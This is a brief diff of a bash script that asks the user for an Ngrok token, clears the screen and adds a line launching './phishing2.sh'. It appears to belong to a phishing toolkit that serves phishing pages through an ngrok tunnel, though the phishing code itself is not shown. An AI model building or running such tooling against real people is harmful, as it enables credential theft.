@@ -63,3 +63,5 @@ read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Tok
 $token
 sleep 2
 clear
+
+./phishing2.sh
